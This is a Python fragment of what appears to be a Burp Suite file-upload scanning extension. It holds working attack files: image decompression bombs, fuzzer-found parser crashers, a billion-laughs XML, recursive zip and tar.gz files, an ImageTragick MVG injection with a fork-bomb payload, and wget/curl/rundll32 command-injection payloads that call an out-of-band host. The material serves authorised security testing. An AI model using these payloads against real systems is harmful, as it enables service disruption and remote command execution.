                      'zMRiYxTu0rd58Up+cF6eJuzwuraT5aMl85A/Lv6b8RBupQ1fV+WjpL/ALh7xU8fKvsLpbSkKcX10rd55NpzWFU1U+s/E+YeJ8szpfxsPrq' \
                      'WhFf7uBa/7jktIeVF0m4zbVWOi1f7uFa/mPd3ni5R/emtGuCpuo1V7OZ/OmsmvkozklWfb2n8uaT6ctd8epen9Sz+7Qa/mcBj+kDWDGyfp' \
                      'nQz+7Ta/mcby2Ok4V7np3Xqc/SfXPxPItLa4Tq1Kn1rzfM4CvprHYlv0slnyVjKqQddvblLPfZnm5S62ytuvrHJ4mT9I/EDnHoyhJ3c6l/' \
                      '8wEZWZUWLxiuzDrYlO+ZmYjGtreZk8VK7zPE7tOrXTuZ1ae0mVXiG5bxim32smitVj1+0qVIckabhd7yKVPIllmsidN23MrTVma1SGTM2r' \
                      'G17FSJnajLLnkQuW8lle7z3FSd7tbi5NddK7t8xPQ7fYSUqbk1vzNjDYRySyLkZbrKp4KUlknn3GlQ0PObVoPwOu0forb2ere53mjdARnF' \
                      'dUqMeb4PQFW8eq8+46zCavVLLqvwPVtH6tRajen+B2mF1Xp7KtTPVxHj2F0FUi45Zew6TC6InFcL8D1aGrtNW+r3dxbjoSEN0To5Wfbz7D' \
                      'aOmoZpmnHBNQO0jo2KVtkV4CK/NLnRbji/U3y/ArVMK7s7mWCjl1SrVwSTfVNc7NcHVwru8ijVwzT3PwO6qYNWeRm1cHnZLcGuNeHan7O4' \
                      'tUqPU3G1PCWnmhY4a3YFce1GNLIinQ35Zs3I4a8VkP9UTdrPwDrenKVMLLZ5mdUwsnfI7yWCSjuKM8CnfI5tcO8K08/8A2G+gafb4HWywc' \
                      'U9xRnhkpbiLWWawvRPvA1XRW12Ac9pkeb19V6EY39cqtv8ARRmVNX6NNv8AtNSXtijusTwruMPEPrNHG8Y521yNTRdOm3ao37ipOjGlubd' \
                      'jfr72Y1eO852SukusyriHCGUPxKM8fJL7NeJarwbTMudJ3ZFkaSpj5W+zWfeU54pylnFZ946dO6IZUmGZEU6+b6i8SL1hLL0SfvJHSuyGV' \
                      'J7bI2tT08eqcl9RCXtZp0NPOk8sHTf7TMF0usKoZm+1HdYfXWth7bOjaMrc5yN/DdK2MwtlHQmGlbnVkeVdgx8Rs5coPHNjcmlwdD5oDCO' \
                      '362RtUvKA0vDdq7g/9aZ/OkOItR3oqeTnP+j+i15QemW/+HcH/rTH/wBPmmHn9AYTP9dM/nZSzLMZ5FfLz/WySv6A/p40u/8AAcJn+umC6' \
                      'ctLNZ6Dwv8ArTPBFOyRLGoL5ef6qcONr3qPTVpWSu9CYZfvZEkemLSdR56Gw2f62R4ZSqLZRcpVFkbPLz/UXjHtsOlPH1t+iaEb8qkizHp' \
                      'DxU9+jaGf6cjxuhVsa1LEKyXaX8vL9T6x6ktdsRUV3o+kv22JLXfEQWWj6Tt+mzzyGIWyFSunBj5eX6esdzPpCxVNXWjKD/bkUavSljqf+' \
                      'D4d/vJHAV6yZj4ionexl8vL9U9Hq9L+kI3S0Lhn+9kZ1Tph0i0/9yYa3/qyPL6r675GdU3M5fJz/R6jPpe0i8/obDZ/rZFWp0saQf8AhGH' \
                      'X7yR5ZLcRS7DPfl+j099KOPbv9FUP9SQHlwG+3L9H9G4h3bMPEO83yOYqa/UajutGzX71GbV1zpTu/UJr94jpeccrL26Kt2mdVjdbkYc9b' \
                      'KUk/wCxT/jRWlrPSb/I5/xoj2i5WrVpXlmsijOknIqy1ipOX5LP+NEf03SefqzX7RNsbsTyo/gQyoXftI3pim3+Tu3+Yj+laf8A5Dv7SbY' \
                      'bDpYfPuK06LU2iR6Tg/7p+JG8dCT+yfiSbFaVNp7iGUeZadeMnwtDHaS3WBsVGuwLLkWPQ3z2vwD0H6QNiurX7iRPkSeg/SFVFr878AbDF' \
                      'Ky7SaNTMZ6J80Js7L33CpYkdS0hyrZEDV3vE2WFTlGlSq9W5bhWzMVT2Va1xyxSg+Fv3myptjpaWJsXoYvcchHSEYv7N+JKtKJf3b8Stid' \
                      'js44zNZ2CeMy3nF/TKUvsX/EL9NJq3oX/ABDYbHU1MTdMpVaza7jD+lVJfZPxD6QUl9m17xbFSWrs5K5Vm7iKtt9lh2xtPfYgyq0v5kUuw' \
                      'v8AqrkuNL3DZYN2+0/AGVQAtPCyvxLwAMUrMY45MtKIOF12Bl6UXHJkTVi9OORWkrK1gg0fdEUtw3az3gWAIFN/esP2u8CQVOzI9rvG7Xe' \
                      'BOm7kqmU9r2kimrgXYyyJOwqRll2kqlkBMBGpNoW7AeR9gt2IBGBJZcgsuQELXaQyV0/aWWt+WRE12AQWYnaTNchj3MCq+IQdPK7IHJ3DP' \
                      '+rEZWyLEJ2sZ7qZCKtms2HWVu06iLUaqsYEa65k0a+Ts7hdrooVUkPdVPtRhwxGW/InjX2nvCbdaG33AVdp8wDEaTTEdSK33JdnIr1IO+Q' \
                      'DJ1IvdcilFy3bxdh3JVFoIsxWeFqS3NDlo+vJZSgveXUu0sxeQYyvo+unnKD9414WrHe45d5st3RXmnc2TRmPD1Lb0I6FR5XRfcchts0Vk' \
                      'XkUvVKje+I9YWqnxIvJdZjhjLFL0U4rNoVNonlmmRNZjIkqnZD9ruIrMclYZBKlJ8h2ywj2j1xGWBNh8xuyyYZZnPRE+1Ddh78iRp3YqVj' \
                      'pIIJRa9xXm0r3LkkynUi8zcjZNVZzj3lac4bXaTTg1crSg1NGWMv0lVN1HaNlfmTx0XXmrqUPexKEbNXNujUSiSjay1onE7N9uHiPWisV9' \
                      '+n4m6qisPvdZBUtYa0biY/nw8SxT0diU+OHiapLF7graorR2J2eKHiBtRa2EANrK9GuZHKlkaCwtftgvESVGcU7xSC2X6Jb+0HTy3WLkko' \
                      '70RtxccmE1U3McpNEjjdjXRm1kl4hmUifWHbN4iww9Xa3K3tLUMNVcOFeJUJNU3Gy3Ij2e41Hg61uBeJE8JV7Ype8pbPluG3fMs1KFSO9f' \
                      'iVX1XmZsZegFu4VOJIkmrmoQ2VxR8pRj2kEq1PLrfgZsEhKuIpvEUl+c/AesVRbyk/AXoXo2t2C2RXhiKctzfgTqpB9v4HKShHHPcJZciT' \
                      'bhb/6GOcf/wAjrOhG14Ecqd1e2RK6tPm/AX0tK1tp+BrZ2pSo3vlkVZUknmjY26byvl7CN4aVRvZV7k2xnJjrqv2FiFVIu/ReKqcFNO/6S' \
                      'FWgNKN9Wiv40SjKZTrXazL0J9UihoLSlPOdGKX+dE6wWKprrQS/aNytkulv3/iPg7MYqNRLNLLvFUZ9oyryrW13sCvtd4DKZXQlStFu9iz' \
                      'F3ElG6ujFsOpFuViBxd9xrTpdxXlTt2AUUuZKuEe4cw2e8CSnvRep8BRhkky7TeQFj8z3FefETX6thjimmBm11dPmZNWL29xuVY3zM2rDr' \
                      'bgKcI9bMmXAxFCz5DmkosIv2q1OFlGStLuNCeaZUlHL2kXtilPiCHGSVIq5CuI7Rc6XqTyLsJKxnwfVLcJZGpvayI+EbdhdhiGW4a+Ie12' \
                      'MNnO9jKHw4jSo8SM+OTL9J5qxxo2MO80bdDs9hg4eWa5nQYWzgm95YfVT9GY1aLuzoakU6e4yqtO7eR0dGE4tNkLXVNCcLSeRSnHIqCq97' \
                      'AdZAUNOGMw/bWiix65hGrKvE5EfT+0RzvGMvTqXWoNZVE7kM50WuNGZT3IkluJxmpZ1KX30mRupBrKaZSqcTGQ7BjZdaUWmt6LEJLtdilH' \
                      '+ROMauKpBR4kM9LDtmiq+Eil2DE6tTqU3fropz2XLJoY+IQqcYabKKW7cQSV3kTt9hC95vrEoXCTvZNkboVHHKDLkH1l3lqO5E3hOxgzwu' \
                      'Ib+ydiv6nir5UJHUy3BHcJMVrno4LGNZYebLcMBjVH8nnl3HSUeJGjH7Mbhm/bkPVMUl1qMkDw1dP7JnUVFdoqzWbHtTHPvD1rfZsPQVtn' \
                      '7NmzK+zkNa7GO4YylRqW4GTwjKNtpW5loZPcTYYno1qcLbU0jew+kMHCmlPEwi13nIT4iF32zDHoT0po1xt63T9lynU0ho9v8qp+Jw0lmM' \
                      'luK1Tq6uLwTbccRB+xmdPEUHuqowgEtGo61K/GgMsDfaiV7x0PtEAHS9MvTQp7kPlwABCFSp2jI9gAFxehvsTreABpH2kUwAOaF8Q17gAu' \
                      'Bst3uK7k0gA0LTbui7F9ZIAMvQkfCEQAgXqW9F6MnsABF7XOjZpNFeazYAY1BLcRS3gBc6DbIilvABehXlvsRS3gBAhnvGSS3AACbKGAAD' \
                      'dpgAAf/2Qo='
            content = content.decode("base64")
            desc_im2 = desc + "The file was taken from a public hackerone report on https://hackerone.com/reports/390 " \
                              "(lottapixel.jpg). The file seems to exploit missing bounds checks in ImageMagick's " \
                              "identify command used by the Paperclip gem in Ruby. The image header says it is 64250 in " \
                              "width and 64250 in height. This means if one byte is allocated per pixel, 4128062500 " \
                              "bytes will be allocated, which results in memory exhaustion. It is therefore very likely " \
                              "that the server is running an outdated version of ImageMagick or GraphicksMagick or is " \
                              "simply not restricting ressource allocation properly."
            new_title = title
            attacks.append((orig_filename, content, '', new_title, desc_im2))
            if orig_filename or orig_ct:
                attacks.append(("lottapixel.jpg", content, "image/jpeg", new_title, desc_im2))

        if injector.opts.file_formats['gif'].isSelected():
            content = 'R0lGODlhAQABAPAAAH9/hwAAACH5BAAAAAAAIf8LTkVUU0NBUEUyLjADAQAAACwAAAAAAQABAAACAkQBACH5BAAAAAAALAAAAAABAAEAAAICRAEAIfkEAAAAAAAsAAAAAAEAAQAAAgJEAQAh+'
            content += 13332 * "QQAAAAAACwAAAAAAQABAAACAkQBACH5BAAAAAAALAAAAAABAAEAAAICRAEAIfkEAAAAAAAsAAAAAAEAAQAAAgJEAQAh+"
            content += 'QQAAAAAACwAAAAAAQABAAACAkQBADs='
            content = content.decode("base64")
            desc_im2 = desc + "The file was taken from a public hackerone report on https://hackerone.com/reports/400 " \
                              "(uber.gif). The file seems to exploit missing bounds checks in ImageMagick's identify " \
                              "command used by the Paperclip gem in Ruby. The image is composed of 40k 1x1 images. " \
                              "This usually results in memory exhaustion or another server side timeout. It is " \
                              "therefore very likely that the server is running an outdated version of ImageMagick or " \
                              "GraphicksMagick or is simply not restricting ressource allocation properly."
            new_title = title
            attacks.append((orig_filename, content, '', new_title, desc_im2))
            if orig_filename or orig_ct:
                attacks.append(("uber.gif", content, "image/gif", new_title, desc_im2))

        if injector.opts.file_formats['png'].isSelected():
            content = 'iVBORw0KGgoAAAANSUhEUgAAnCAAAAAgBAMAAABSWQRUAAAAElBMVEX///////////8AAAD/AAD//wB+tBpvAAAAAXRSTlMAQObYZgAAAAF' \
                      'iS0dEAIgFHUgAAACfSURBVCjPfdHBEcMgDETRTEpIBcnfDrRUYFRB+i8mB7BsOIQT82alQeLx5vX8cJ3HeVHIC7QelbDDzoSYEIDS9gotW' \
                      '/8HhLwCKL0C1gbIt4cBzIRmwidE4CUx3nHcSgzwBTlG4mwSBZ4bqX3Ith0qCHVoHapHy1B2aha1zMyMqB45gEpsYA842Epu4MyWvj5KY0L' \
                      'twA7XLNjWaLHuVOAH7HBQQpH5l3oAAAAJSURBVAAACxIAAAsSQgFa+bcAAAAJSURBVAAACxIAAAsSQgFa+bcAAAAJSURBVAAACxIAAHBQQ' \
                      'puxU4EAAAAJSURBVAAACxIAAHBQQpuxU4EAAAAJSURBVAAACxIAAAsSQgFa+bcAAAAJSURBVAAACxIAAAsSQgFa+bcAAAAJSURBVAAACxI' \
                      'AAAsSQgFa+bcAAAAJSURBVAAACxIAAAsSQgFa+bcAAAAJSURBVAAACxIAAHBQQpuxU4EAAAAJSURBVAAACxIAAAsSQgFa+bcAAAAJSURBV' \
                      'AAACxIAAAsSQgFa+bcAAAAJSURBVAAACxIAAAsSAe6P6Z0AAAAJSURBVAAACxIAAAsSQgFa+bcAAAAJSURBVAAACxIAAAsSQgFa+bcAAAA' \
                      'KSURBVAAACxILEgHVfvzLRAATAAAACUlEQVQAAAsSAAALEkIBWvm3AAAACUlEQVQDAAAACklEQVTG5kw1AAAACUlEQVQAAAsSAAALEkIBW' \
                      'vm3AAAACUlEQVQAxcl5Re5BjpETPW6DAAAACUlEQVQAAAsSAAALEkIBWvm3AAAACUlEQVQAAAsSAAALEkIBWvm3AAAACUlEQVQAAAsSAAB' \
                      'wUEKbsVOBAAAACUlEQVQAAAsSAAALEkIBWvm3AAAACUlEQVQAAAsSAAALEkIBWvm3AAAACUlEQVQAAAsSAAALEgHuj+mdAAAACUlEQVQAA' \
                      'AsSAAALEkIBWvm3AAAACUlEQVQAAAsSAAALEkIBWvm3AAAACklEQVQAAAALEgAACxJCgKuXlgAAAAlJREFUAAALEgAACxJCAVr5twAAAAl' \
                      'JREFUAAALEgAACxIB7o/pnQAAAAlJREFUAAALEgAACxJCAVr5twAAAAlJCxJ+/AAA'
            content = content.decode("base64")
            desc_pil = desc + "The file was created by floyd during an offline fuzzing run with the Python Image Library (PIL/Pillow). "
            desc_pil += "It usually leads to a Python exception of:<br>broken PNG file (chunk b'\xe5\xe6')<br>"
            desc_pil += "Our test server then returned an HTTP 500 error."
            new_title = title
            attacks.append((orig_filename, content, '', new_title, desc_pil))
            if orig_filename or orig_ct:
                attacks.append(("pythonImageLibrary.png", content, "image/png", new_title, desc_pil))

        if injector.opts.file_formats['ico'].isSelected():
            content = '\x00\x00\x01\x00\x01\x00  \x10\x00\x01\x00\x04\x00\xe8\x02\x00\x00\x16\x00\x00\x00(\x00\x00\x00\x01\x00\x00' \
                      '\x00@\x00\x00\x08\x01\x00\x18\x00\x00\x00\x00\x00\x00\x01\x00\x01\x00\x04\x00\xe8\x02\x00\x00\x00\xe8=====' \
                      '=====================================================9====================================================' \
                      '========================333\x0333\x03333333330333\x0333\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb' \
                      '\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb' \
                      '\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb' \
                      '\xdb\xdb\xdb\xdb\xdb'
            desc_pil = desc + "The file was created by floyd during an offline fuzzing run with the Python Image Library (PIL/Pillow). " \
                              "On my machine this takes more than 25 seconds to process. The .ico image routine seems to be used in Pillow 4.0.0."
            new_title = title
            attacks.append((orig_filename, content, '', new_title, desc_pil))
            if orig_filename or orig_ct:
                attacks.append(("pythonImageLibrary2.ico", content, "image/vnd.microsoft.icon", new_title, desc_pil))
                if orig_ct:
                    attacks.append(("pythonImageLibrary3.ico", content, "image/x-icon", new_title, desc_pil))

        if injector.opts.file_formats['tiff'].isSelected():
            content = 'II*\x00\xa0\x00\x00\x00\x80?\x01P8$\t\x86\xc0\x82\xd6\xc2\x83\xf8\x1b\xc0\x06\x00*\xbf\xe1\x8f\xf7\x9b\xfd\xf7\x00' \
                      '\x00\xf9\x00\x00\x00\r\x01\x02\x00\x08\x00\x00\x00\x9f\x01\x00\x00\x11\x01\xe5\x00\x01\x00\x00\x00\x08\x00\x00\x00' \
                      '\x122\xf7\xfb\x0e\x06\x0f\x9a\x0c\xde\x109\xa4l\xfe\xff\x9aL\x97\xef\xc0\x1c\t\xf9\x1a\xa2\xc5\xa5\x93X#\x00\x00' \
                      '\x00\x1eA\x07\x84\xf7\x89>R\xfc\x18\x94\xd8\xa4\xfa[\xcd\x82U*\x94\xe2o\xf6-\x80\xa7\x03y\xd9l0\xd6-\x80\xaf\x04' \
                      '\xb5[\xe6%P\xa8\x02\t/\x1f\xbf.\xf1(-\xe2S\x02x\x00\x18\x14\xb8L\n\x02\x12\x00\x00\x01\t\x00\x01\x00\x00\x00 \x00' \
                      '\x00\x08\x01\x01\x01\x00\xe5\x00\x00\x00 \x00\x00\x00\x02\x01\x03\x00\x01\x00\x00\x00\x02\x00\x00\x00\x03\x01\x03' \
                      '\x01\x01\x00\x00\x00\x05\x00\x00\x00\n\x01\x03\x00\x01\x00\x00\x00\x03\x00\x00\x00\n\x01\x03\x00\x01\x00\x00\x00' \
                      '\x01\x00\x00\x00\r\x01\x02\x00\x08\x1f\x01\x00~\x01\x00\x00\x11\x01\x04\x00\x01\x00\x00\x00\x08\x00\x00\x00\x12' \
                      '\x01\x03\x00\x01\x00\x00\x00\x01\x00\x00\x00\x15\x01\x03\x00\x01\x00\x00\x00\x01\x00\x00\x00\x16\x01\x05\x00\x01' \
                      '\x00\x00\x00\x86\x01\x00\x00\x1b\x03\x00\x01\x00\x00\x00\x01\x03\x00\x01\x00\x00\x00\x00\x04\x00\x00\x17\x01\x04' \
                      '\x00\x01\x00\x00\x00\x98\x00\x00\x00\x1a\x01\x05\x00\x01\x00\x00\x00\x86\x01\x00\x00\x1b\x01\x05\x00\x01\x00\x00' \
                      '\x00\x8e\x01\x00\x00\x1c\x01\x03\x00\x01\x00\x00\x00\x01\x00\x00\x00(\x01\n\x00\x01\x00\x00\x00\x01\x00\x00\x00)' \
                      '\x01\x03\x00\x02\x00\x00\x00\x00\x00\x01\x00@\x9d\x9d\x9d\x9d\x9d\x9d\x9d\x9d\x9d\x9d\x9d\x9d\x9d\x9d\x80'
            desc_pil = desc + "The file was created by floyd during an offline fuzzing run with the Python Image Library (PIL/Pillow). " \
                              "On my machine this takes a long time and uses a lot of memory (RAM). Pillow 4.0.0."
            new_title = title
            attacks.append((orig_filename, content, '', new_title, desc_pil))
            if orig_filename or orig_ct:
                attacks.append(("pythonImageLibrary2.tiff", content, "image/tiff", new_title, desc_pil))

        if injector.opts.file_formats['jpeg'].isSelected():
            content = '\xff\xd80\x00\x1000000000000000\xe1\x00xExif\x00\x00MM\x00*\x00\x00\x00p00000000000000000000000000000000000' \
                      '000000000000000000000000000000000000000000000000000000000000000000000'
            desc_php = desc + "The file was found by Hanno Boeck during a fuzzing run with PHP. " \
                              "See details on https://blog.fuzzing-project.org/43-PHP-EXIF-parser-out-of-bounds-reads-" \
                              "CVE-2016-4542,-CVE-2016-4543,-CVE-2016-4544-and-a-note-on-custom-memory-allocators.html . "
            new_title = title
            attacks.append((orig_filename, content, '', new_title, desc_php))
            if orig_filename or orig_ct:
                attacks.append(("CVE20164543.jpeg", content, "image/jpeg", new_title, desc_php))

            content = '\xff\xd80\x00\x1000000000000000\xe1\x00\\Exif\x00\x00MM\x00*\x00\x00\x00\x08\x00\x060000\x00\x00\x00\x01000' \
                      '00000\x00\x00\x00\x0100000000\x00\x00\x00\x0100000000\x00\x00\x00\x0400000000\x00\x00\x00\x0100000000\x00' \
                      '\x00\x00\x00000000'
            attacks.append((orig_filename, content, '', new_title, desc_php))
            if orig_filename or orig_ct:
                attacks.append(("CVE20164543.jpeg", content, "image/jpeg", new_title, desc_php))

            content = '\xff\xd80\x00\x1000000000000000\xe1\x00xExif\x00\x00MM\x00*\x00\x00\x00\x08\x00\x060000\x00\x00\x00\x010000' \
                      '0000\x00\x00\x00\x0100000000\x00\x00\x00\x0100000000\x00\x00\x00\x0400000000\x00\x00\x00\x010000\x82\x9800' \
                      '\x00\x00\x00\t\x00\x00\x00f000000000000000000000000\x0000000'
            new_title = title
            attacks.append((orig_filename, content, '', new_title, desc_php))
            if orig_filename or orig_ct:
                attacks.append(("CVE20164542.jpeg", content, "image/jpeg", new_title, desc_php))

            content = '\xff\xd80\x00\x1000000000000000\xe1\x00\x0cExif\x00\x00MM00'
            new_title = title
            attacks.append((orig_filename, content, '', new_title, desc_php))
            if orig_filename or orig_ct:
                attacks.append(("CVE20164544.jpeg", content, "image/jpeg", new_title, desc_php))

        if injector.opts.file_formats['jpeg'].isSelected():
            content = '\xff\xd8\xe1\xff\x01\x00\x00\x00'
            desc_java = desc + "The file was found by Rody Kersten during a fuzzing run with Java ImageIO with his " \
                               "AFL-based Kelinci Java fuzzer. See details on https://github.com/isstac/kelinci " \
                               "https://issues.apache.org/jira/browse/IMAGING-203 and " \
                               "http://bugs.java.com/bugdatabase/view_bug.do?bug_id=JDK-8188756. "
            new_title = title
            attacks.append((orig_filename, content, '', new_title, desc_java))
            if orig_filename or orig_ct:
                attacks.append(("IMAGING-203.jpeg", content, "image/jpeg", new_title, desc_java))

        if injector.opts.file_formats['jpeg'].isSelected():
            content = 'eJz7f+P/AwYBLzdHBwZGRiYGGSBk+H+bwZlBQ0ZOWU5Sg1dRWVdbw8AmxdHG3Nzmf0SsZ8rEhpnT+ht6uhZseXa4f9WttV09J/6fvvXu6////2cffPH//6//z/7+/wEyhFFbV9fG1KbM37Hsx9KepT9wA+' \
                      'vd1tjA/wMMghwsCgwKzIyODEwijMyKjP+PsPw/wqAqwMDExMjCyMzKAAWMTMyCDCxCioZKjoGFwiLGiQuBysQYgYABBTAyAcWlBBkZmJghMr9g4oJCSo7/bzHwAMWZBIGG2TOElRse3SHA25i+MG1Tce0' \
                      'pBYa1klpuJAIPBNOKkFpdMBlOlLnGSOwwGOMCVqWamEJQHSoErfEgqAILCCOsBCtwJaykHsZIcIMlT6hAhptbKLrqRBymAJPqf3IcCAVOxChCJLn/H9HSIFHg/z0yNCEAB24paSKNYKHIAQwMK6G0IKZU' \
                      'PXYd2MMJ5A5EuGJP49iAKZhUiQZTDjiVAQuAX26QlK4HF0xAikiiLYQDT6yi6AEKEmpgwGZ8O5x1BUUcll+RcgEI2OF3TQg4Lf7/yIBhPTJwZMNvCmqqh5vChDXKvgEzGJwjiz2yKU7iuAEo8b8AMVCcT' \
                      'GF6RvYSKpAlJ3/jAu8R9nD8QpaAVLD/0SpYXMaAA/0XLlnKAVK45hNIOPgA3DxhBgZWZgZGWOWOQzUL1uyCG0Sj8DSw2t+AIejihtvfKABPIcsASjAMDHIgxn27GfJwUQF0ZdNm4Q5bN7cKPL5DBAdqzc' \
                      'fAiKkUHqK4C0K09hMei8FgST9z+u+ZoqaTbkR4paTaVk7wSru8pCVQef6cKwvVXe40PpbdGhpWcHWZ+tGt8u08uUJ5Kqzesh/PJmauq/J5tWRawLp3yWoNj95f+AgMHjyhOG2WmWtaSojustmvCg96Mfy' \
                      '5pt3063nf/5sAwnQt6A=='
            content = content.decode("base64").decode("zip")
            desc_java = desc + "The file was found by floyd during a fuzzing run with Java Apache Commons JPEG parser " \
                               "with the AFL-based Kelinci Java fuzzer. See details on " \
                               "https://issues.apache.org/jira/browse/IMAGING-215 "
            new_title = title
            attacks.append((orig_filename, content, '', new_title, desc_java))
            if orig_filename or orig_ct:
                attacks.append(("IMAGING-215.jpeg", content, "image/jpeg", new_title, desc_java))

        if injector.opts.file_formats['xml'].isSelected():
            content = '<?xml version="1.0"?><!DOCTYPE lolz [ <!ENTITY lol "lol"> <!ELEMENT lolz (#PCDATA)> <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"> ' \
                      '<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;"> <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"> ' \
                      '<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"> <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;"> ' \
                      '<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;"> <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;"> ' \
                      '<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;"> <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;"> ' \
                      ']> <lolz>&lol9;</lolz>'
            new_title = title
            desc_lol = desc + "The billion laughs attack, see https://en.wikipedia.org/wiki/Billion_laughs ."
            attacks.append((orig_filename, content, '', new_title, desc_lol))
            if orig_filename or orig_ct:
                attacks.append(("BillionLaughs.xml", content, "application/xml", new_title, desc_lol))
                if orig_ct:
                    attacks.append(("BillionLaughs.xml", content, "text/xml", new_title, desc_lol))

        if injector.opts.file_formats['zip'].isSelected():
            content = 'UEsDBBQAAAAIAAgDZDz59IlkSAEAALgBAAAHAAAAci9yLnppcAAlANr/UEsDBBQAAAAIAAgDZDz59IlkSAEAALgBAAAHAAAAci9yLnppcAAvAND/ACUA2v9QSwMEFAAAAAgACANkPPn0iWRIAQAAuAEAAAcAA' \
                      'AByL3IuemlwAC8A0P/CVI5XOQAFAPr/wlSOVzkABQD6/wAFAPr/ABQA6//CVI5XOQAFAPr/AAUA+v8AFADr/0KIIcQAABQA6/9CiCHEAAAUAOv/QoghxAAAFADr/0KIIcQAABQA6/9CiCHEAAAAAP//AAAA/' \
                      '/8ANADL/0KIIcQAAAAA//8AAAD//wA0AMv/QughXg8AAAD//wrwZmQSYcAV3OigSL9IryqzIMCblQ3EZwRCUwYGBkAABgD5/20BAAAAAELoIV4PAAAA//8K8GZkEmHAFdzooEi/SK8qsyDAm5UNxGcEQlMGB' \
                      'gZAAAYA+f9tAQAAAABQSwECFAAUAAAACAAIA2Q8+fSJZEgBAAC4AQAABwAAAAAAAAAAAAAAAAAAAAAAci9yLnppcFBLBQYAAAAAAQABADUAAABtAQAAAAA='
            content = content.decode("base64")
            new_title = title
            desc_rzip = desc + "A zip file r.zip that contains itself. See https://research.swtch.com/zip ."
            attacks.append((orig_filename, content, '', new_title, desc_rzip))
            if orig_filename or orig_ct:
                attacks.append(("r.zip", content, "application/zip", new_title, desc_rzip))

        if injector.opts.file_formats['gzip'].isSelected():
            content = 'H4sIAAAAAAAAACrSL9IrSSzSS69ioBkwAAIzExMgbQ7hI4mbGhuB2YYo6k0MzcwZFGDqRgHtgHw3B5QFAAAA//8APADD/yrSL9IrSSzSS69ioBkwAAIzExMgbQ7hI4mbGhuB2YYo6k0MzcwZFGDqRgHtgHw3B' \
                      '5QFAAAA//8APADD/0LoJV0vAAUA+v9C6CVdLwAFAPr/AAUA+v8AFADr/0LoJV0vAAUA+v8ABQD6/wAUAOv/QoghxAAAFADr/0KIIcQAABQA6/9CiCHEAAAUAOv/QoghxAAAFADr/0KIIcQAAAAA//8AAAD//' \
                      'wAnANj/QoghxAAAAAD//wAAAP//ACcA2P/CVIZVGQAAAP//AAgA9/8PYlI2AAgAAGIYBaNgFIyCQQ0AAQAA///CVIZVGQAAAP//AAgA9/8PYlI2AAgAAGIYBaNgFIyCQQ0AAQAA//8PYlI2AAgAAA=='
            content = content.decode("base64")
            new_title = title
            desc_rgz = desc + "A tar.gz file r.tar.gz that contains itself. See https://research.swtch.com/zip ."
            attacks.append((orig_filename, content, '', new_title, desc_rgz))
            if orig_filename or orig_ct:
                attacks.append(("r.tar.gz", content, "application/gzip", new_title, desc_rgz))
                if orig_ct:
                    attacks.append(("r.tar.gz", content, "application/x-tar", new_title, desc_rgz))

        if injector.opts.file_formats['mvg'].isSelected():
            content = "push graphic-context\n" \
                      "viewbox 0 0 " + str(injector.opts.image_width) + " " + str(injector.opts.image_height) + "\n" \
                      "fill 'url(" + Constants.MARKER_CACHE_DEFEAT_URL + "`:(){ :|:& };:`)'\npop graphic-context"
            new_title = title
            desc_fork_bomb = desc + "An ImageTragick CVE-2016-3714 injection with a fork bomb as a payload."
            attacks.append((orig_filename, content, '', new_title, desc_fork_bomb))
            if orig_filename or orig_ct:
                attacks.append(("image.jpeg", content, "image/jpeg", new_title, desc_fork_bomb))

        for filename, content, content_type, title, desc in attacks:
            req = injector.get_request(filename, content, content_type)
            if req:
                resp = self._make_http_request(injector, req, report_timeouts=False)
                if not resp:
                    # connection timeout occured
                    base_request_response = injector.get_brr()
                    brr = CustomRequestResponse("", "", base_request_response.getHttpService(),
                                                req, None)
                    csi = self._create_issue_template(brr, title, desc, "Tentative", "Medium")
                    self._add_scan_issue(csi)

    # Helper functions
    def _filename_to_expected(self, filename):
        # TODO feature: maybe try to download both?
        # For filenames that include %00 or \x00 we assume we require the server to truncate there
        # so we want to redownload the truncated file name:
        for nullstr in ("%00", "\x00"):
            if nullstr in filename:
                filename = filename[:filename.index(nullstr)]
        return filename

    def _get_rce_interaction_commands(self, injector, burp_colab):
        # Format: name, command, server_placeholder, replace
        # Rules for payloads regarding command injection: While a nslookup is sufficient (Windows and Unix) and we wouldn't
        # need wget or curl we also need to keep people in mind that use Burp Collaborator IP configs in internal networks.
        # There might be no option to detect DNS interactions, therefore wget and curl are still valid payloads in certain
        # scenarios. It also means that we have to handle that case.
        # configs etc. In general we would like to do:
        # inbound response based (e.g. nslookup stdout or PHP string concat stdout detection) - always
        # inbound sleep (unix) and ping -n (windows) for timeout detection - always
        # nslookup (unix and windows) for Collaborator interaction - always
        # wget and curl (unix) and rundll32 (windows) for IP Collaborators - and as UI option (disabled by default)

        # When is wget and curl better than nslookup?
        # 1. When we have a Burp Collaborator configured as an IP (no DNS Collaborator) - autodetected in this extension
        # 2. When the server is not allowed to do DNS queries, but allowed to connect to a proxy that does DNS queries
        if burp_colab.is_ip_collaborator or injector.opts.wget_curl_payloads:
            yield "Wget", "wget -O-", Constants.MARKER_COLLAB_URL, None
            yield "Curl", "curl", Constants.MARKER_COLLAB_URL, None
            yield "Rundll32", "rundll32 url.dll,FileProtocolHandler", Constants.MARKER_COLLAB_URL, None
